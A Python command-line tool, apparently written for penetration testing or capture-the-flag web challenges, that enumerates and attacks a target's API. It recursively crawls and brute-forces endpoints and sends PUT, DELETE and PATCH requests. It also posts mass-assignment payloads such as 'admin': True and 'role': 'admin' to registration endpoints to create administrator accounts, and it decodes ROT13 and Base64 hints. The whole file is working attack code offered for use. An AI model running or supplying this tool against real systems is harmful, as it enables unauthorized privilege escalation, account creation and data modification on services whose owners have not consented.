#!/usr/bin/env python3
"""
Enhanced API Enumeration Tool
Features:
- Recursive API discovery from /api root
- Authentication cookie support (PHPSESSID, JWT)
- HTTP method testing with privilege escalation detection
- Response analysis with encoding detection (ROT13, Base64)
- Endpoint brute forcing
"""

import requests
import json
import argparse
import base64
import codecs
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor

def set_auth_cookie(session, cookie_string):
    """Set authentication cookie"""
    if '=' in cookie_string:
        key, value = cookie_string.split('=', 1)
        session.cookies.set(key, value)
        print(f"[+] Set cookie: {key}=***")

def detect_encoding(text):
    """Auto-detect and decode common encodings"""
    results = []
    
    # Base64 detection
    try:
        if len(text) % 4 == 0 and all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in text):
            decoded = base64.b64decode(text).decode('utf-8')
            results.append(('Base64', decoded))
    except:
        pass
    
    # ROT13 detection
    try:
        decoded = codecs.decode(text, 'rot_13')
        if any(word in decoded.lower() for word in ['admin', 'password', 'secret', 'key']):
            results.append(('ROT13', decoded))
    except:
        pass
    
    return results

def recursive_api_discovery(session, base_url, max_depth=3):
    """Recursively discover API endpoints"""
    print(f"[*] Starting recursive API discovery from {base_url}/api")
    
    discovered = []
    queue = ['/api', '/api/v1', '/api/v2']
    visited = set()
    depth = 0
    
    while queue and depth < max_depth:
        current_batch = queue[:]
        queue = []
        depth += 1
        
        for path in current_batch:
            if path in visited:
                continue
                
            visited.add(path)
            full_url = urljoin(base_url, path)
            
            try:
                response = session.get(full_url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    print(f"[+] Found endpoint: {path} (depth: {depth})")
                    discovered.append({'path': path, 'url': full_url, 'depth': depth})
                    
                    # Parse JSON for new paths
                    try:
                        data = response.json()
                        new_paths = extract_paths_from_json(data)
                        queue.extend([p for p in new_paths if p not in visited])
                        
                        # Check for encoded data
                        analyze_json_response(data, path)
                        
                    except:
                        pass
                        
            except Exception as e:
                pass
    
    return discovered

def extract_paths_from_json(data, prefix=''):
    """Extract API paths from JSON response"""
    paths = []
    
    if isinstance(data, dict):
        for key, value in data.items():
            if isinstance(value, str) and value.startswith('/'):
                paths.append(value)
            elif key in ['url', 'endpoint', 'path', 'href'] and isinstance(value, str):
                if value.startswith('/'):
                    paths.append(value)
            elif isinstance(value, (dict, list)):
                paths.extend(extract_paths_from_json(value))
    elif isinstance(data, list):
        for item in data:
            if isinstance(item, (dict, list)):
                paths.extend(extract_paths_from_json(item))
    
    return paths

def analyze_json_response(data, endpoint):
    """Analyze JSON response for encoded data and hints"""
    if isinstance(data, dict):
        # Check for ROT13 encoding hint
        if data.get('enctype') == 'ROT13' and 'data' in data:
            try:
                decoded = codecs.decode(data['data'], 'rot_13')
                print(f"    → Decoded ROT13: {decoded}")
            except:
                pass
        
        # Check for Base64 encoding hint
        if data.get('format') == 'encoded' and 'data' in data:
            try:
                decoded = base64.b64decode(data['data']).decode('utf-8')
                print(f"    → Decoded Base64: {decoded}")
            except:
                pass
        
        # Look for privilege hints
        priv_keys = ['admin', 'role', 'privileges', 'is_admin']
        found_privs = {k: v for k, v in data.items() if k in priv_keys}
        if found_privs:
            print(f"    → Privilege hints: {found_privs}")

def test_http_methods(session, endpoint_url):
    """Test HTTP methods with privilege escalation payloads"""
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
    results = {}
    
    print(f"[*] Testing HTTP methods on {endpoint_url}")
    
    for method in methods:
        try:
            # Prepare privilege escalation payload for POST/PUT
            test_data = None
            if method in ['POST', 'PUT', 'PATCH']:
                test_data = {
                    "email": "test@example.com",
                    "admin": True,
                    "role": "admin",
                    "is_admin": 1,
                    "privileges": ["admin"]
                }
            
            response = session.request(
                method,
                endpoint_url,
                json=test_data,
                headers={'Content-Type': 'application/json'},
                timeout=10,
                verify=False
            )
            
            results[method] = response.status_code
            
            if response.status_code not in [404, 405]:
                print(f"    [{response.status_code}] {method}")
                
                # Check for privilege escalation success
                if method in ['POST', 'PUT'] and response.status_code in [200, 201]:
                    try:
                        json_data = response.json()
                        if any(key in json_data for key in ['admin', 'role', 'privileges']):
                            print(f"    → PRIVILEGE ESCALATION POSSIBLE!")
                    except:
                        pass
                        
        except Exception:
            pass
    
    return results

def brute_force_endpoints(session, base_url, wordlist=None):
    """Brute force API endpoints"""
    if not wordlist:
        wordlist = [
            'users', 'admin', 'auth', 'login', 'register',
            'config', 'settings', 'status', 'health', 'version',
            'profile', 'account', 'dashboard', 'upload', 'files'
        ]
    
    print(f"[*] Brute forcing API endpoints")
    found = []
    
    api_bases = ['/api', '/api/v1', '/api/v2', '/rest']
    
    def check_endpoint(combo):
        base, word = combo
        endpoint = f"{base}/{word}"
        full_url = urljoin(base_url, endpoint)
        
        try:
            response = session.get(full_url, timeout=5, verify=False)
            if response.status_code in [200, 201, 401, 403]:
                print(f"[+] Found: {endpoint} [{response.status_code}]")
                found.append({'path': endpoint, 'status': response.status_code})
        except:
            pass
    
    # Create combinations of bases and words
    combinations = [(base, word) for base in api_bases for word in wordlist]
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(check_endpoint, combinations)
    
    return found

def test_privilege_escalation(session, base_url):
    """Test for privilege escalation via registration"""
    print(f"[*] Testing privilege escalation")
    
    register_endpoints = ['/register', '/api/register', '/api/v1/register', '/users/register']
    
    for endpoint in register_endpoints:
        full_url = urljoin(base_url, endpoint)
        
        # Test with admin privileges
        admin_payloads = [
            {"username": "testadmin", "password": "test123", "admin": True},
            {"username": "testadmin", "password": "test123", "role": "admin"},
            {"username": "testadmin", "password": "test123", "is_admin": 1}
        ]
        
        for payload in admin_payloads:
            try:
                response = session.post(
                    full_url,
                    json=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=10,
                    verify=False
                )
                
                if response.status_code in [200, 201]:
                    print(f"[CRITICAL] Privilege escalation possible at {endpoint}")
                    print(f"    → Payload: {payload}")
                    print(f"    → Response: {response.text[:100]}...")
                    
            except:
                pass

def main():
    parser = argparse.ArgumentParser(description="Enhanced API Enumeration Tool")
    parser.add_argument("target", help="Target URL (e.g., http://example.com)")
    parser.add_argument("--cookie", help="Authentication cookie (e.g., PHPSESSID=abc123)")
    parser.add_argument("--recursive", action="store_true", help="Recursive API discovery")
    parser.add_argument("--methods", action="store_true", help="Test HTTP methods")
    parser.add_argument("--brute", action="store_true", help="Brute force endpoints")
    parser.add_argument("--privesc", action="store_true", help="Test privilege escalation")
    parser.add_argument("--all", action="store_true", help="Run all tests")
    
    args = parser.parse_args()
    
    # Setup session
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 API Scanner'})
    session.verify = False
    
    # Set authentication cookie
    if args.cookie:
        set_auth_cookie(session, args.cookie)
    
    base_url = args.target.rstrip('/')
    
    print(f"[*] Enhanced API enumeration on {base_url}")
    print(f"[*] Cookie: {'Yes' if args.cookie else 'No'}")
    
    # Recursive discovery
    if args.recursive or args.all:
        discovered = recursive_api_discovery(session, base_url)
        
        # Test methods on discovered endpoints
        if (args.methods or args.all) and discovered:
            for endpoint in discovered[:3]:
                test_http_methods(session, endpoint['url'])
    
    # Brute force endpoints
    if args.brute or args.all:
        brute_force_endpoints(session, base_url)
    
    # Test privilege escalation
    if args.privesc or args.all:
        test_privilege_escalation(session, base_url)

if __name__ == "__main__":
    main()